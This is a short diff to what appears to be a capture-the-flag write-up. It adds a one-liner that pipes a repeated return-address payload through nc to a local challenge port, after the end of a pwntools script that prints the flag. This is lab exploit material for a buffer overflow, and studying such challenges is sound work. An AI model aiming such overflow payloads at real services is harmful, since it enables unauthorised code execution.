@@ -33,3 +33,7 @@ io.recvuntil(b'The flag is: ')
 log.success(io.recvline().decode())
 io.close()
 ```
+
+```zsh
+python3 -c "import sys;a=b'\x46\x13\x40\x00\x00\x00\x00\x00';sys.stdout.buffer.write((a*10+b'\x0a')*2)"|nc localhost 10002
+```
